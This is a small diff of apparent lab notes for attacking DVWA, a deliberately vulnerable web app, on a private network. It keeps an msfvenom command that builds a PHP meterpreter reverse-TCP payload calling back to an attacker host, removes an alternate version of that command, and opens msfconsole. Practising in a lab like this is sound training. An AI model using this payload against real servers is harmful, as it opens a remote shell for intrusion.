@@ -65,8 +65,6 @@ In parrot browser > http://192.168.1.7/dvwa
 
 New terminal
 msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.9 LPORT=9999 --platform php -o Desktop/upload.php
-or
-msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.9 LPORT=9999 shell.php
 
 New terminal
 msfconsole
